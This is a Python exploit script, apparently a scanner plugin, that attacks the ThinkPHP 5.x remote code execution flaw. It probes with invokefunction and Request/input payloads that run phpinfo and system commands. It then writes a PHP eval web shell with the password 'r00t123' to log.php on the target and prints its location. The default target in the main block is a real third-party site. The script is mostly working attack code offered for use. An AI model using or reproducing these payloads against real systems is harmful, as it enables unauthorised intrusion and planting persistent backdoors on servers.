#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: ThinkPHP V5.x远程代码执行漏洞_2
referer: https://xz.aliyun.com/t/3570
author: qianxiao996
description: thinkphp 5.x全版本任意代码执行
'''

import sys
import requests
import warnings
sys.path.append('../../')
from color import *

class thinkphp_v5x_code_exec_2:
    def __init__(self, url):
        self.url = url
    def getshell(self,url,check_path):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        shell_payload = [
            r"?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<^?php%20eval($_POST['r00t123']);?^>^success%20>>log.php",
            r"?s=index/\think\template\driver\file/write&cacheFile=log.php&content=%3C?php%20eval($_POST['r00t123']);?%3Esuccess"]
        try:
            for sp in shell_payload:
                shell_poc = check_path + sp
                response = requests.get(url=shell_poc,headers=headers, verify=False,timeout =5)
                res = response.text
                res = res.encode('gbk', 'ignore')
                res = res.decode('gbk')
                if "public" in check_path:
                    shell_path = url + "/public/" + "log.php"
                else:
                    shell_path = url + "/" + "log.php"
                # print shell_path
                response1 = requests.get(url=shell_path,headers=headers, verify=False,timeout =5)
                if response1.status_code == 200 and "success" in response1.text:
                    print(u"[+]存在ThinkPHP V5.x 远程代码执行漏洞...\tWebshell: %s | Pass: r00t123" % shell_path)
            shell_poc = check_path + r"?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET['r00t123']);&r00t123=phpinfo();"
            # print shell_poc
            response = requests.get(url=shell_poc,headers=headers, verify=False,timeout =5)
            res = response.text
            res = res.encode('gbk', 'ignore')
            res = res.decode('gbk')
            if 'PHP Version' in res:
                shell_path = url + "?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_POST['r00t123']);"
                printGreen("[+]Success:ThinkPHP V5.x 远程代码执行漏洞...\tWebshell: %s | Pass: r00t123" % shell_path)
            else:
                printGreen("[+]Success:存在ThinkPHP V5.x 远程代码执行漏洞...\tWebshell: %s" % "unknown")
        except:
            printGreen("[+]Success:ThinkPHP V5.x 远程代码执行漏洞...\tWebshell:%s" % "unknown")

    def getPath(self,url):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = {r"?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
                   r"?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
                   r"?s=index/\think\Request/input&filter=phpinfo&data=1",
                   r"?s=index/\think\Request/input&filter=system&data=echo melvyn",
                   r"?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
                   r"?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo melvyn"}
        try:
            path = ["/", "/public/index.php"]
            for p in path:
                for pl in payload:
                    check_path = url + p
                    # print check_path
                    check_poc = check_path + pl
                    response = requests.get(url=check_poc,headers=headers, verify=False,timeout =5)
                    if response.status_code == 200 or response.status_code == 500:
                        res = response.text
                        res = res.encode('gbk', 'ignore')
                        res = res.decode('gbk')
                        if 'PHP Version' in res or "melvyn" in res:
                            return check_path
                        else:
                            pass
                    else:
                        printBlue(u"[-]Info:不存在ThinkPHP V5.x 远程代码执行漏洞...")
        except:
            printYellow("[-]Warning:" + self.__class__.__name__ + " ==>可能不存在漏洞")
    def run(self):
        check_path = self.getPath(self.url)
        # print(check_path)
        if check_path:
            # print("11")
            self.getshell(self.url, check_path)
        if check_path==None:
            printBlue(u"[-]Info:不存在ThinkPHP V5.x 远程代码执行漏洞...")
if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = thinkphp_v5x_code_exec_2("http://baidu.com")
    testVuln.run()





